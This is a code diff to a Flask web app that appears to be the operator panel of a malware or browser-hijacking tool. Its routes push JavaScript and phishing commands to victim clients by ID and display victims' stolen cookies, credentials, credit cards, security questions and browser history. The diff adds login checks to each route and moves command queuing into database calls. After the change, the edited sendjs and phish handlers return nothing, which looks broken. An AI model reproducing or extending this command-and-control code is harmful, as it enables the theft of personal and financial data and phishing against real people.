@@ -14,7 +14,6 @@ login_manager.login_view = 'login'
 active_users = None
 
 
-
 # user class not really sensible because only one attacker but necessary for implementing login
 class User(UserMixin):
     def __init__(self, id):
@@ -31,6 +30,7 @@ def load_user(userid):
 
 
 @app_flask.route('/', methods=['GET', 'POST'])
+@login_required
 def login():
     form = LoginForm()
     error = None
@@ -56,6 +56,7 @@ def attack_mode():
 
 
 @app_flask.route('/update', methods=['POST'])
+@login_required
 def update():
     return redirect(url_for('attack_mode'))
 
@@ -69,33 +70,28 @@ def logout():
 
 
 @app_flask.route('/sendjs', methods=['POST'])
+@login_required
 def sendjs():
-    socketio.emit('connect', {'id':'9999'}, namespace="hi")
     a = request.form['js']
     b = request.form['id']
-    c = a + '\n' + b
-    #add_js_command(b, a)
-    if (check_status(b)):
-        return c
-    else:
-        update_payload(b, a)
-    return c
+    z = request.form['pattern']
+    c = a + '\n' + b + '\n' + z
+    database.add_js_command(b, z, a)
 
 
 @app_flask.route('/phish', methods=['POST'])
+@login_required
 def phish():
     d = request.form['id']
-    e = "Phish" + request.form['number']
-    f = d + '\n' + e
-    # add_phish_command(d, e)
-    if (check_status(d)):
-        return f
-    else:
-        update_payload(d, e)
-    return f
+    e = request.form['number']
+    y = request.form['pattern']
+    f = d + '\n' + e + '\n' + y
+    database.add_phish_command(d, y, e)
+
 
 
 @app_flask.route('/getinfo', methods=['POST'])
+@login_required
 def getinfo():
     userid = int(request.form['id'])
     conn = database.getConn()
@@ -117,22 +113,21 @@ def getinfo():
     # with open(browser_history) as bh:
     #     head = [next(bh) for x in range(10)]
 
-
     return render_template('result.html', data=record, cookies=cookies, credentials=credentials,
                            creditcards=creditcards, questions=questions, history = head)
 
-
-def update_payload(id, text):
-    conn = database.getConn()
-    with conn.cursor() as cur:
-        cur.execute("UPDATE Client SET NextPayload = concat(NextPayload, (%s), '\n') WHERE ID = (%s)", (text, id))
-        conn.close()
-
-def check_status(user):
-    active_users = [i[0] for i in app.connected_clients]
-    if (active_users.__contains__(user)):
-        return True
-    return False
+#
+# def update_payload(id, text):
+#     conn = database.getConn()
+#     with conn.cursor() as cur:
+#         cur.execute("UPDATE Client SET NextPayload = concat(NextPayload, (%s), '\n') WHERE ID = (%s)", (text, id))
+#         conn.close()
+#
+# def check_status(user):
+#     active_users = [i[0] for i in app.connected_clients]
+#     if (active_users.__contains__(user)):
+#         return True
+#     return False
 
 
 if __name__ == '__main__':
